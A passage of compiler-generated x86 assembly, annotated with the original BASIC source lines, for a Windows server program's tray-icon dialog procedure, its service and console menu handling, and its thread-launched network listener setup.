	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.97:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.97			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,148			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody6A.server:
;
; [742] SHARED hwnd
;
; [743] USER32_POINT pt
; .composites = ebp-40	; internal variable
#ifdef DialogProc.pt
#undef DialogProc.pt
#endif
#define DialogProc.pt ebp-44	; exposes local variable 'pt'
;
;
; [744] STATIC cFlag
data section 'globals$statics'
align	4
%6A%cFlag.server:	db 4 dup ?
.code
;
; [745] SHARED APPLSTATUS
data section 'globals$shared'
align	4
%APPLSTATUS.server:	db 4 dup ?
.code
;
; [746] STATIC WM_TaskbarRestart
data section 'globals$statics'
align	4
%6A%WM_TaskbarRestart.server:	db 4 dup ?
.code
;
; [749] SELECT CASE uMsg
	mov	eax,d[ebp+12]			;;; i665
; .select6A.0035 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
;
; [751] CASE $$WM_INITDIALOG:
	mov	eax,272			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0035.0001.server			;;; i71
;
; [752] WM_TaskbarRestart = RegisterWindowMessageA(&"TaskbarCreated")' listen for explorer restarts
;
; [0] EXTERNAL FUNCTION RegisterWindowMessageA (lpString)
	mov	eax,addr @_string.0192.server			;;; i642
	push	eax			;;; i667a
	call	_RegisterWindowMessageA@4			;;; i619
	mov	d[%6A%WM_TaskbarRestart.server],eax			;;; i668
;
; [753] InstallTrayIcon (hwndDlg)
	push	[ebp+8]			;;; i674a
	call	func73.server			;;; i619
;
; [755] #hPopMenu = CreatePopupMenu ()
data section 'globals$shared'
align	4
%#hPopMenu.server:	db 4 dup ?
.code
;
; [0] EXTERNAL FUNCTION CreatePopupMenu ()
	call	_CreatePopupMenu@0			;;; i619
	mov	d[%#hPopMenu.server],eax			;;; i668
;
; [756] AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Console_Show,&"Show &Console")
;
; [0] EXTERNAL FUNCTION AppendMenuA (hMenu, wFlags, wIDNewItem, lpNewItem)
	mov	eax,addr @_string.0195.server			;;; i642
	push	eax			;;; i667a
	push	40007			;;; i656a
	push	0			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [758] IFF APPLSTATUS THEN
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0036.server			;;; i195
;
; [759] AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Server_Start,&"S&tart Server")
	mov	eax,addr @_string.0196.server			;;; i642
	push	eax			;;; i667a
	push	40004			;;; i656a
	push	0			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [760] ELSE
	jmp	end.if.0036.server			;;; i107
else.0036.server:
;
; [761] AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Server_Stop,&"S&top Server")
	mov	eax,addr @_string.0197.server			;;; i642
	push	eax			;;; i667a
	push	40005			;;; i656a
	push	0			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [762] END IF
end.if.0036.server:
;
; [764] AppendMenuA (#hPopMenu, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [765] AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Icon_Hide,&"Hide &Icon")
	mov	eax,addr @_string.0199.server			;;; i642
	push	eax			;;; i667a
	push	40008			;;; i656a
	push	0			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [766] AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Service_Stop,&"&Stop Service")
	mov	eax,addr @_string.019A.server			;;; i642
	push	eax			;;; i667a
	push	40001			;;; i656a
	push	0			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [767] AppendMenuA (#hPopMenu, $$MF_STRING,$$ID_Service_Remove,&"&Remove Service")
	mov	eax,addr @_string.019B.server			;;; i642
	push	eax			;;; i667a
	push	40002			;;; i656a
	push	0			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [769] ShowWindow (hwndDlg, $$SW_HIDE)' hide dialog
;
; [0] EXTERNAL FUNCTION ShowWindow (hwnd, nCmdShow)
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_ShowWindow@8			;;; i619
;
; [770] SetWindowPos(hwndDlg,NULL,-100,-100,0,0,$$SWP_NOZORDER | $$SWP_NOMOVE)
;
; [0] EXTERNAL FUNCTION SetWindowPos (hwnd, hWndInsertAfter, x, y, cx, cy, wFlags)
#ifdef DialogProc.NULL
#undef DialogProc.NULL
#endif
#define DialogProc.NULL ebp-52	; exposes local variable 'NULL'
;
	mov	eax,100			;;; i659
	neg	eax			;;; i916
; .xstk6A.0000 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	mov	eax,100			;;; i659
	neg	eax			;;; i916
; .xstk6A.0001 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	mov	eax,4			;;; i659
	or	eax,2			;;; i763
	push	eax			;;; i667a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_SetWindowPos@28			;;; i619
;
; [771] hwnd = hwndDlg
	mov	eax,d[ebp+8]			;;; i665
	mov	d[%hwnd.server],eax			;;; i668
;
; [773] CASE WM_TaskbarRestart	: InstallTrayIcon (hwndDlg)
	jmp	end.select.0035.server			;;; i69
case.0035.0001.server:
	mov	eax,d[%6A%WM_TaskbarRestart.server]			;;; i663a
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0035.0002.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func73.server			;;; i619
;
; [774] CASE $$WM_TRAYICON 		:' taskbar mouse event message
	jmp	end.select.0035.server			;;; i69
case.0035.0002.server:
	mov	eax,1025			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0035.0003.server			;;; i71
;
; [775] idIcon = wParam
#ifdef DialogProc.idIcon
#undef DialogProc.idIcon
#endif
#define DialogProc.idIcon ebp-72	; exposes local variable 'idIcon'
;
	mov	eax,d[ebp+16]			;;; i665
	mov	d[ebp-72],eax			;;; i670
;
; [776] mouseMsg = lParam
#ifdef DialogProc.mouseMsg
#undef DialogProc.mouseMsg
#endif
#define DialogProc.mouseMsg ebp-76	; exposes local variable 'mouseMsg'
;
	mov	eax,d[ebp+20]			;;; i665
	mov	d[ebp-76],eax			;;; i670
;
; [777] SELECT CASE mouseMsg
	mov	eax,d[ebp-76]			;;; i665
; .select6A.0037 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
;
; [778] CASE $$WM_RBUTTONDOWN   :
	mov	eax,516			;;; i659
	mov	ebx,d[ebp-80]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0037.0001.server			;;; i71
;
; [779] GetCursorPos (&pt)
;
; [0] EXTERNAL FUNCTION GetCursorPos (lpPoint)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	_GetCursorPos@4			;;; i619
;
; [780] SetForegroundWindow (hwndDlg)
;
; [0] EXTERNAL FUNCTION SetForegroundWindow (hwnd)
	push	[ebp+8]			;;; i674a
	call	_SetForegroundWindow@4			;;; i619
;
; [781] TrackPopupMenuEx (#hPopMenu, $$TPM_LEFTALIGN | $$TPM_LEFTBUTTON | $$TPM_RIGHTBUTTON, pt.x, pt.y, hwndDlg, 0)
;
; [0] EXTERNAL FUNCTION TrackPopupMenuEx (hMenu, un, n1, n2, hWnd, lpTPMParams)
	mov	eax,0			;;; i659
	or	eax,0			;;; i763
	or	eax,2			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
; .xstk6A.0002 = ebp-88	; internal variable
	mov	d[ebp-88],eax			;;; i670
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[%#hPopMenu.server]			;;; i672a
	call	_TrackPopupMenuEx@24			;;; i619
;
; [783] CASE $$WM_LBUTTONDOWN   :
	jmp	end.select.0037.server			;;; i69
case.0037.0001.server:
	mov	eax,513			;;; i659
	mov	ebx,d[ebp-80]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0037.0002.server			;;; i71
;
; [784] 'ShowWindow (hwndDlg, $$SW_SHOWNORMAL)
;
; [785] 'SetForegroundWindow (hwndDlg)
;
; [786] END SELECT
case.0037.0002.server:
end.select.0037.server:
;
; [788] CASE $$WM_COMMAND:
	jmp	end.select.0035.server			;;; i69
case.0035.0003.server:
	mov	eax,273			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0035.0004.server			;;; i71
;
; [789] SELECT CASE wParam
	mov	eax,d[ebp+16]			;;; i665
; .select6A.0038 = ebp-92	; internal variable
	mov	d[ebp-92],eax			;;; i670
;
; [790] CASE $$ID_Service_Remove	:ClientShell (0,GetServerPath()+" -remove")
	mov	eax,40002			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0001.server			;;; i71
	call	func14.server			;;; i619
	mov	ebx,addr @_string.0100.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	0			;;; i656a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [791] ModifyMenuA (#hPopMenu, $$ID_Service_Remove, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Service_Install, &"Install Service")
;
; [0] EXTERNAL FUNCTION ModifyMenuA (hMenu, nPosition, wFlags, wIDNewItem, lpString)
	mov	eax,0			;;; i657
	or	eax,0			;;; i763
	or	eax,16			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.01AD.server			;;; i642
	push	eax			;;; i667a
	push	40003			;;; i656a
	push	[ebp-60]			;;; i674a
	push	40002			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [792] CASE $$ID_Service_Install	:CmdInstallService()
	jmp	end.select.0038.server			;;; i69
case.0038.0001.server:
	mov	eax,40003			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0002.server			;;; i71
	call	func66.server			;;; i619
;
; [793] ModifyMenuA (#hPopMenu, $$ID_Service_Install, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Service_Remove, &"Remove Service")
	mov	eax,0			;;; i657
	or	eax,0			;;; i763
	or	eax,16			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.01AE.server			;;; i642
	push	eax			;;; i667a
	push	40002			;;; i656a
	push	[ebp-60]			;;; i674a
	push	40003			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [794] CASE $$ID_Service_Stop	:ServiceStop()
	jmp	end.select.0038.server			;;; i69
case.0038.0002.server:
	mov	eax,40001			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0003.server			;;; i71
	call	func6C.server			;;; i619
;
; [795] CASE $$ID_Server_Start	:IFT StartNetServer(0) THEN
	jmp	end.select.0038.server			;;; i69
case.0038.0003.server:
	mov	eax,40004			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0004.server			;;; i71
	push	0			;;; i656a
	call	func71.server			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0039.server			;;; i221
;
; [796] ModifyMenuA (#hPopMenu, $$ID_Server_Start, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Server_Stop, &"Stop Server")
	mov	eax,0			;;; i657
	or	eax,0			;;; i763
	or	eax,16			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.01AF.server			;;; i642
	push	eax			;;; i667a
	push	40005			;;; i656a
	push	[ebp-60]			;;; i674a
	push	40004			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [797] END IF
else.0039.server:
end.if.0039.server:
;
; [798] CASE $$ID_Server_Stop	:ShutDown()
	jmp	end.select.0038.server			;;; i69
case.0038.0004.server:
	mov	eax,40005			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0005.server			;;; i71
	call	funcD.server			;;; i619
;
; [799] 'ModifyMenuA (#hPopMenu, $$ID_Server_Stop, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Server_Start, &"Start Server")
;
; [800] CASE $$ID_Console_Hide 	:XioHideConsole()
	jmp	end.select.0038.server			;;; i69
case.0038.0005.server:
	mov	eax,40006			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0006.server			;;; i71
;
; [0] EXTERNAL FUNCTION  XioHideConsole ()
	call	_XioHideConsole@0			;;; i619
;
; [801] ModifyMenuA (#hPopMenu, $$ID_Console_Hide, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Console_Show, &"Show Console")
	mov	eax,0			;;; i657
	or	eax,0			;;; i763
	or	eax,16			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.01B0.server			;;; i642
	push	eax			;;; i667a
	push	40007			;;; i656a
	push	[ebp-60]			;;; i674a
	push	40006			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [802] CASE $$ID_Console_Show 	:IFF cFlag THEN
	jmp	end.select.0038.server			;;; i69
case.0038.0006.server:
	mov	eax,40007			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0007.server			;;; i71
	mov	eax,d[%6A%cFlag.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.003A.server			;;; i195
;
; [803] XioCreateConsole ($$ServTitle, 50)
;
; [0] EXTERNAL FUNCTION  XioCreateConsole (@title$, nlines)
	mov	eax,addr @_string.0077.server			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	50			;;; i656a
	push	[ebp-60]			;;; i674a
	call	_XioCreateConsole@8			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [804] cFlag = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%6A%cFlag.server],eax			;;; i668
;
; [805] ELSE
	jmp	end.if.003A.server			;;; i107
else.003A.server:
;
; [806] XioShowConsole()
;
; [0] EXTERNAL FUNCTION  XioShowConsole ()
	call	_XioShowConsole@0			;;; i619
;
; [807] END IF
end.if.003A.server:
;
; [808] ModifyMenuA (#hPopMenu, $$ID_Console_Show, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Console_Hide, &"Hide Console")
	mov	eax,0			;;; i657
	or	eax,0			;;; i763
	or	eax,16			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.01B2.server			;;; i642
	push	eax			;;; i667a
	push	40006			;;; i656a
	push	[ebp-60]			;;; i674a
	push	40007			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [809] CASE $$ID_Icon_Hide		:RemoveTrayIcon ()
	jmp	end.select.0038.server			;;; i69
case.0038.0007.server:
	mov	eax,40008			;;; i659
	mov	ebx,d[ebp-92]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0038.0008.server			;;; i71
	call	func70.server			;;; i619
;
; [810] END SELECT
case.0038.0008.server:
end.select.0038.server:
;
; [811] CASE ELSE 						:RETURN 0
	jmp	end.select.0035.server			;;; i69
case.0035.0004.server:
	mov	eax,0			;;; i659
	jmp	end.func6A.server			;;; i258
;
; [812] END SELECT
end.select.0035.server:
;
; [814] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func6A.server			;;; i258
;
; [815] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DialogProc.server:  ;;; Function end label for Assembly Programmers.
end.func6A.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  DialogProc ()  *****
;  *****
;
; [817] FUNCTION StartMenuInit (var)
.code
;
#ifdef StartMenuInit.var
#undef StartMenuInit.var
#endif
#define StartMenuInit.var ebp+8	; exposes function argument 'var'
;
align 16
_StartMenuInit.server@4:
;  *****
;  *****  FUNCTION  StartMenuInit ()  *****
;  *****
func72.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody72.server:
;
; [818] STATIC CallOnce
data section 'globals$statics'
align	4
%72%CallOnce.server:	db 4 dup ?
.code
;
; [819] SHARED hwnd
;
; [821] IFF CallOnce THEN
	mov	eax,d[%72%CallOnce.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.003B.server			;;; i195
;
; [822] CallOnce = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%72%CallOnce.server],eax			;;; i668
;
; [823] _beginthreadex(NULL,0,&MenuInit(),var,0,NULL)
;
; [0] EXTERNAL CFUNCTION  _beginthreadex (lpThreadAttributes, dwStackSize, Startess, lpParameter, dwCreationFlags, lpThreadId)
#ifdef StartMenuInit.NULL
#undef StartMenuInit.NULL
#endif
#define StartMenuInit.NULL ebp-40	; exposes local variable 'NULL'
;
	mov	eax,addr _MenuInit.server@4			;;; i599
; .xstk72.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	[ebp-40]			;;; i674a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	push	[ebp-40]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [824] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [825] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func72.server			;;; i258
;
; [826] ELSE
	jmp	end.if.003B.server			;;; i107
else.003B.server:
;
; [827] IF hwnd THEN
	mov	eax,d[%hwnd.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.003C.server			;;; i221
;
; [828] RETURN InstallTrayIcon (hwnd)
	push	[%hwnd.server]			;;; i672a
	call	func73.server			;;; i619
	jmp	end.func72.server			;;; i258
;
; [829] ELSE
	jmp	end.if.003C.server			;;; i107
else.003C.server:
;
; [830] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func72.server			;;; i258
;
; [831] END IF
end.if.003C.server:
;
; [832] END IF
end.if.003B.server:
;
; [834] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.StartMenuInit.server:  ;;; Function end label for Assembly Programmers.
end.func72.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  StartMenuInit ()  *****
;  *****
;
; [836] FUNCTION StartNetServer(var)
.code
;
#ifdef StartNetServer.var
#undef StartNetServer.var
#endif
#define StartNetServer.var ebp+8	; exposes function argument 'var'
;
align 16
_StartNetServer.server@4:
;  *****
;  *****  FUNCTION  StartNetServer ()  *****
;  *****
func71.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody71.server:
;
; [837] SHARED APPLSTATUS
;
; [839] IFF APPLSTATUS THEN
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.003D.server			;;; i195
;
; [840] _beginthreadex  (NULL,0,&NetInit(),var,0,NULL)
#ifdef StartNetServer.NULL
#undef StartNetServer.NULL
#endif
#define StartNetServer.NULL ebp-40	; exposes local variable 'NULL'
;
	mov	eax,addr _NetInit.server@0			;;; i599
; .xstk71.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	[ebp-40]			;;; i674a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	push	[ebp-40]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [841] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [842] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func71.server			;;; i258
;
; [843] ELSE
	jmp	end.if.003D.server			;;; i107
else.003D.server:
;
; [844] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func71.server			;;; i258
;
; [845] END IF
end.if.003D.server:
;
; [847] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.StartNetServer.server:  ;;; Function end label for Assembly Programmers.
end.func71.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  StartNetServer ()  *****
;  *****
;
; [849] FUNCTION NetInit ()
.code
align 16
_NetInit.server@0:
;  *****
;  *****  FUNCTION  NetInit ()  *****
;  *****
func3.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.109:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.109			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
funcBody3.server:
;
; [850] STATIC socket
data section 'globals$statics'
align	4
%3%socket.server:	db 4 dup ?
.code
;
; [851] SHARED client
data section 'globals$shared'
align	4
%client.server:	db 4 dup ?
.code
;
; [852] SHARED APPLSTATUS
;
; [853] SHARED CONNECTED
data section 'globals$shared'
align	4
%CONNECTED.server:	db 4 dup ?
.code
;
; [854] STRING buffer,auth,ip
#ifdef NetInit.buffer
#undef NetInit.buffer
#endif
#define NetInit.buffer ebp-40	; exposes local variable 'buffer'
;
#ifdef NetInit.auth
#undef NetInit.auth
#endif
#define NetInit.auth ebp-44	; exposes local variable 'auth'
;
#ifdef NetInit.ip
#undef NetInit.ip
#endif
#define NetInit.ip ebp-48	; exposes local variable 'ip'
;
;
; [855] STATIC message$
data section 'globals$statics'
align	4
%3%message$.server:	db 4 dup ?
.code
;
; [856] XLONG tid
#ifdef NetInit.tid
#undef NetInit.tid
#endif
#define NetInit.tid ebp-52	; exposes local variable 'tid'
;
;
; [859] IFF Initialize() THEN
	call	func4.server			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.003E.server			;;; i195
;
; [860] APPLSTATUS = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%APPLSTATUS.server],eax			;;; i668
;
; [861] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3.server			;;; i258
;
; [862] END IF
else.003E.server:
end.if.003E.server:
;
; [864] DO
align 8
do.003F.server:
;
; [865] ip = GetLocalIpA()
	call	func15.server			;;; i619
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [866] IF (LEFT$(ip,3) == "127") THEN Sleep (1000)
	sub	esp,64			;;; i487
	mov	eax,[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.01C3.server			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.0040.server			;;; i219
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
else.0040.server:
end.if.0040.server:
;
; [867] LOOP WHILE (LEFT$(ip,3) == "127")
do.loop.003F.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.01C3.server			;;; i663
	call	%_string.compare.sv			;;; i690
	je	< do.003F.server			;;; i193
end.do.003F.server:
;
; [869] #IPAddr$ = ip
data section 'globals$shared'
align	4
%#IPAddr$.server:	db 4 dup ?
.code
	mov	eax,[ebp-48]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %#IPAddr$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [870] IFF p2pCreateBindSocket (ip,#Port,@socket) THEN
	mov	eax,d[ebp-48]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk3.0000 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
data section 'globals$shared'
align	4
%#Port.server:	db 4 dup ?
.code
	push	[%3%socket.server]			;;; i672a
	push	[%#Port.server]			;;; i672a
	push	[ebp-60]			;;; i674a
	call	func7A.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+8]			;;; i877a
	mov	d[%3%socket.server],ecx			;;; i668
	add	esp,12			;;; i633
	test	eax,eax			;;; i194
	jnz	>> else.0041.server			;;; i195
;
; [871] ShutDown ()' unable to bind socket to port
	call	funcD.server			;;; i619
;
; [872] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3.server			;;; i258
;
; [873] END IF
else.0041.server:
end.if.0041.server:
;
; [875] p2pListen (socket)
	push	[%3%socket.server]			;;; i672a
	call	func78.server			;;; i619
;
; [876] auth = "AUTH "+ $$SR_AUTHPASS
	mov	eax,addr @_string.01C6.server			;;; i663
	mov	ebx,addr @_string.18E4.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
